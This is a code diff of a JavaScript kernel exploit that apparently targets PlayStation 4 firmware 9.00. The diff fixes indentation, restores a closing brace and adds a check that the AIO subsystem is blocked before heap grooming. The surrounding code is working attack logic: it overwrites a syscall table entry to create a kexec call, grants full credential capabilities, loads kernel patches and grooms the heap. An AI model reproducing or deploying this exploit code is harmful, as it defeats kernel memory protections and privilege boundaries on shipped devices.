@@ -1501,14 +1501,14 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         throw RangeError('kernel patching unsupported');
     }
 
-   log('change sys_aio_submit() to sys_kexec()');
+    log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
-     const offset_sysent_661 = 0x1107f00;
+    const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
     // .sy_narg = 6
-   kmem.write32(sysent_661, 6);
+    kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
-     kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
+    kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
 
@@ -1519,8 +1519,6 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // cr_sceCaps[1]
     kmem.write64(p_ucred.add(0x68), -1);
 
-
-    
     const buf = await get_patches('./kpatch/900.elf');
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
@@ -1599,8 +1597,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes"
     //alert("kernel exploit succeeded!");
-
- 
+}
 
 
 
@@ -1620,6 +1617,20 @@ function setup(block_fd) {
         reqs1.write32(0x20 + i*0x28, block_fd);
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
+
+    {
+        const reqs1 = make_reqs1(1);
+        const timo = new Word(1);
+        const id = new Word();
+        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
+        chain.do_syscall_clear_errno(
+            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
+        const err = chain.errno;
+        if (err !== 60) { // ETIMEDOUT
+            die(`SceAIO system not blocked. errno: ${err}`);
+        }
+        free_aios(id.addr, 1);
+    }
 
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
